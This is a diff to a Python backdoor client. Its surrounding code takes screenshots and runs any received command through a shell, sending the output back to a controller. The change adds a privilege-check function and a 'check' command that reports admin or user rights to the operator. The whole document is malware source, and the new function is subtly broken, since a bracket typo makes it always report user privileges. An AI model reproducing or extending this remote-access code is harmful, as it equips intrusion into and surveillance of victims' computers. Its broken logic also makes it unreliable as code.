@@ -23,6 +23,14 @@ def reliable_recv():
             return json.loads(data)
         except ValueError:
             continue
+def is_admin():
+    global admin
+    try:
+        temp = os.listdir(os.sep.join[os.environ.get('SystemRoot','C:\windows'), 'temp'])
+    except:
+        admin = "[!!] User privileges!"
+    else:
+        admin = "[+] Administration privileges!"
 
 def screenshot():
     with mss() as screenshot:
@@ -76,6 +84,12 @@ def shell():
                 os.remove("monitor-1.png")
             except:
                 reliable_send("[!!] Failed to take screenshot")
+        elif command[:5] == "check":
+            try:
+                is_admin()
+                reliable_send(admin)
+            except:
+                reliable_send("Cant perform the check")
         else:
             proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             result = proc.stdout.read() + proc.stderr.read()
